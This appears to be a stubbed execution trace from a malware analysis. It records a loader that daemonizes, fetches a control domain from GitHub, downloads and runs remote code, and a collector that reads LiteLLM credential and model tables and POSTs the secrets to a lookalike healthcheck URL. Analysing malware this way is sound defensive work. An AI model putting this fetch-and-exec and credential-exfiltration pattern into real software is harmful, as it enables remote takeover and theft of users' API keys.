{
  "method": "Original source with stub imports, HTTP, database, fork, file I/O and remote exec; no external side effects",
  "loader": [
    [
      "open",
      "/tmp/remote_code_loader.lock",
      "w"
    ],
    [
      "flock",
      "<stub-file>",
      6
    ],
    [
      "fork"
    ],
    [
      "setsid"
    ],
    [
      "chdir",
      "/"
    ],
    [
      "open",
      "/dev/null",
      "r+b"
    ],
    [
      "dup2",
      99,
      0
    ],
    [
      "dup2",
      99,
      1
    ],
    [
      "dup2",
      99,
      2
    ],
    [
      "GET",
      "https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt"
    ],
    [
      "GET",
      "http://control.invalid:8080/codepy"
    ],
    [
      "REMOTE_EXEC",
      "print('remote payload')"
    ],
    [
      "sleep",
      3600
    ]
  ],
  "collector": [
    [
      "DB_CONNECT"
    ],
    [
      "SQL",
      "SELECT \"credential_name\", \"credential_values\" FROM \"LiteLLM_CredentialsTable\" LIMIT 500"
    ],
    [
      "SQL",
      "SELECT \"model_name\", \"litellm_params\" FROM \"LiteLLM_ProxyModelTable\" LIMIT 500"
    ],
    [
      "POST",
      "http://www.litellm.dev/healthcheck",
      {
        "json": {
          "credentials": [
            {
              "credential_values": "secret-sentinel"
            }
          ],
          "models": [
            {
              "litellm_params": {
                "api_key": "key-sentinel"
              }
            }
          ]
        }
      }
    ],
    [
      "DB_DISCONNECT"
    ]
  ]
}
